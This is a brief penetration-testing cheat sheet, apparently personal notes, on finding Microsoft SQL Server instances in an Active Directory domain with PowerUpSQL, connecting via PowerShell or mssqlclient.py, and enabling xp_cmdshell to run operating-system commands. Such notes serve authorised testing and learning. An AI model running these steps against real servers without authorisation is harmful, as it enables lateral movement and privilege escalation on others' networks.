---
tags:
  - Authenticated
  - Lateral-Movement
  - Privilege-Escalation
  - AD
---
## Identify
---
[https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
```PowerShell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```
Connect - Windows
```PowerShell
Get-SQLQuery -Verbose -Instance "host,port" -username "domain.local\\user" -password "password" -query 'Select @@version'
```
Connect - Linux
```Bash
mssqlclient.py DOMAIN/USER@IP -windows-auth
```
## Exploit
---
Run commands with xp_cmdshell
```Bash
SQL> enable_xp_cmdshell
xp_cmdshell whoami /priv
```